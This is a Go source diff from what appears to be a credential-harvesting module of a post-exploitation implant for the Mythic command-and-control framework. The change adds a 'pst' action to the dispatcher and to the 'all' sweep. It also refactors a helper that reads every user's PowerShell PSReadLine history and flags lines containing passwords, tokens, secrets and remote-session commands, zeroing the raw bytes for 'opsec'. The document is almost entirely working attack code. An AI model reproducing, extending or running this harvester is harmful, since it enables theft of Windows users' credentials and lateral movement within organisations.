@@ -23,12 +23,14 @@ func credHarvestDispatch(args credHarvestArgs) structs.CommandResult {
 		return credM365Tokens(args)
 	case "history":
 		return credHistory(args)
+	case "pst":
+		return credPST(args)
 	case "browser-live":
 		return credBrowserLive(args)
 	case "all":
 		return credAllWindows(args)
 	default:
-		return errorf("Unknown action: %s\nAvailable: cloud, configs, windows, m365-tokens, history, browser-live, all", args.Action)
+		return errorf("Unknown action: %s\nAvailable: cloud, configs, windows, m365-tokens, history, pst, browser-live, all", args.Action)
 	}
 }
 
@@ -40,47 +42,7 @@ func credWindows(args credHarvestArgs) structs.CommandResult {
 
 	homes := getUserHomes(args.User)
 
-	// PowerShell history
-	sb.WriteString("--- PowerShell History ---\n")
-	psFound := false
-	for _, home := range homes {
-		psHistoryPath := filepath.Join(home, "AppData", "Roaming", "Microsoft", "Windows", "PowerShell", "PSReadLine", "ConsoleHost_history.txt")
-		info, err := os.Stat(psHistoryPath)
-		if err != nil {
-			continue
-		}
-		psFound = true
-		sb.WriteString(fmt.Sprintf("  [FILE] %s (%d bytes)\n", psHistoryPath, info.Size()))
-
-		if data, err := os.ReadFile(psHistoryPath); err == nil {
-			content := string(data)
-			structs.ZeroBytes(data) // opsec: clear raw history bytes from memory
-			lines := strings.Split(strings.TrimRight(content, "\r\n"), "\n")
-			// Show last 50 lines, highlight credential-related commands
-			start := 0
-			if len(lines) > 50 {
-				start = len(lines) - 50
-				sb.WriteString(fmt.Sprintf("  (%d total lines, showing last 50)\n", len(lines)))
-			}
-			for _, line := range lines[start:] {
-				line = strings.TrimRight(line, "\r")
-				lower := strings.ToLower(line)
-				// Flag credential-related commands
-				if strings.Contains(lower, "password") || strings.Contains(lower, "credential") ||
-					strings.Contains(lower, "secret") || strings.Contains(lower, "token") ||
-					strings.Contains(lower, "convertto-securestring") || strings.Contains(lower, "get-credential") ||
-					strings.Contains(lower, "invoke-command") || strings.Contains(lower, "enter-pssession") ||
-					strings.Contains(lower, "new-pssession") || strings.Contains(lower, "-credential") {
-					sb.WriteString(fmt.Sprintf("  >>> %s\n", line))
-				} else {
-					sb.WriteString(fmt.Sprintf("      %s\n", line))
-				}
-			}
-		}
-	}
-	if !psFound {
-		sb.WriteString("  (no PowerShell history found)\n")
-	}
+	credHarvestPSHistory(&sb, homes)
 
 	// RDP connection history (saved connections)
 	sb.WriteString("\n--- RDP Saved Connections ---\n")
@@ -189,6 +151,59 @@ func credWindows(args credHarvestArgs) structs.CommandResult {
 	return result
 }
 
+var credSensitiveKeywords = []string{
+	"password", "credential", "secret", "token",
+	"convertto-securestring", "get-credential",
+	"invoke-command", "enter-pssession",
+	"new-pssession", "-credential",
+}
+
+func credHarvestPSHistory(sb *strings.Builder, homes []string) {
+	sb.WriteString("--- PowerShell History ---\n")
+	found := false
+	for _, home := range homes {
+		psHistoryPath := filepath.Join(home, "AppData", "Roaming", "Microsoft", "Windows", "PowerShell", "PSReadLine", "ConsoleHost_history.txt")
+		info, err := os.Stat(psHistoryPath)
+		if err != nil {
+			continue
+		}
+		found = true
+		sb.WriteString(fmt.Sprintf("  [FILE] %s (%d bytes)\n", psHistoryPath, info.Size()))
+
+		data, err := os.ReadFile(psHistoryPath)
+		if err != nil {
+			continue
+		}
+		content := string(data)
+		structs.ZeroBytes(data)
+		lines := strings.Split(strings.TrimRight(content, "\r\n"), "\n")
+		start := 0
+		if len(lines) > 50 {
+			start = len(lines) - 50
+			sb.WriteString(fmt.Sprintf("  (%d total lines, showing last 50)\n", len(lines)))
+		}
+		for _, line := range lines[start:] {
+			line = strings.TrimRight(line, "\r")
+			lower := strings.ToLower(line)
+			flagged := false
+			for _, kw := range credSensitiveKeywords {
+				if strings.Contains(lower, kw) {
+					flagged = true
+					break
+				}
+			}
+			if flagged {
+				sb.WriteString(fmt.Sprintf("  >>> %s\n", line))
+			} else {
+				sb.WriteString(fmt.Sprintf("      %s\n", line))
+			}
+		}
+	}
+	if !found {
+		sb.WriteString("  (no PowerShell history found)\n")
+	}
+}
+
 func credAllWindows(args credHarvestArgs) structs.CommandResult {
 	var sb strings.Builder
 	var allCreds []structs.MythicCredential
@@ -223,8 +238,15 @@ func credAllWindows(args credHarvestArgs) structs.CommandResult {
 
 	history := credHistory(args)
 	sb.WriteString(history.Output)
+	sb.WriteString("\n")
 	if history.Credentials != nil {
 		allCreds = append(allCreds, *history.Credentials...)
+	}
+
+	pst := credPST(args)
+	sb.WriteString(pst.Output)
+	if pst.Credentials != nil {
+		allCreds = append(allCreds, *pst.Credentials...)
 	}
 
 	result := structs.CommandResult{
